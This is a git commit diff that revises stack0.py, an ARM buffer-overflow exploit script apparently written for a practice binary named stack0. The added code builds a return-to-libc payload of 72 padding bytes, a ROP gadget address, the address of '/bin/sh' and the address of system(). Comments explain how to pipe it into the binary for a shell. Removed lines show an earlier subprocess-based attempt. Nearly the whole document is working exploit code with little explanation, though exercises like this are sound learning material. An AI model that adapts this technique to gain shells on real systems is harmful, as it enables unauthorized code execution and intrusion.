e62c1fd3ad8b5de3e5bab2366de1128eaed7fad1
vivek-parikh <techblades888@gmail.com>
2017-02-06 12:12:05 +0000

    corrected shellcode, added steps in python file,moved unnecessary files to old

--- stack0/stack0.py
+++ stack0/stack0.py
@@ -1,34 +1,9 @@
+# python stack0.py > stack0_exploit
+# cat stack0_exploit - | ./stack0
 import struct
-from pattern import *
-PATTERN=pattern_gen(70)
-system_address=struct.pack("<I", 0xb6f29bc4)
-bin_sh=struct.pack("<I", 0xb6fc5304) 
-print system_address
-a=PATTERN+system_address+bin_sh
-a='aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqbbb'+'rabc'+'sccc' #76
-import subprocess
-print '\npopen3:'
-payload = 'A' * 72
-
-#payload += struct.pack("<I", 0x76EE012C)
-payload += struct.pack("<I", 0xb6f29bc4)
-payload += struct.pack("<I", 0x7efff7f3)
-payload += 'BBBB'
-payload += struct.pack("<I", 0x76EC2BC8)
-payload += 'CCCC'
+payload  = 'A' * 72  #overflow buffer
+payload += struct.pack("<I", 0xB6F52D5C)#rop gadget (pop r0,r5,pc) in /lib/arm-linux-gnueabihf/libc-2.19.so
+payload += struct.pack("<I", 0xb6fc4304)#r0=addr of /bin/sh
 payload += 'DDDD'
-payload += 'EEEE'
-payload += 'FFFF'
-payload += struct.pack("<I", 0x76e9ffac)
-print("[*] Sending Payload (!)")
-proc = subprocess.Popen('./stack0',
-                        shell=True,
-                        stdin=subprocess.PIPE,
-                        stdout=subprocess.PIPE,
-                        stderr=subprocess.PIPE,
-                        )
-print proc.stdout
-#stdout_value, stderr_value = proc.communicate('through stdin to stdout')
-stdout_value, stderr_value = proc.communicate(payload)
-print '\tpass through:', repr(stdout_value)
-print '\tstderr      :', repr(stderr_value)
+payload += struct.pack("<I", 0xb6f28bc5)#address of __libc_system (or system)
+print(payload)
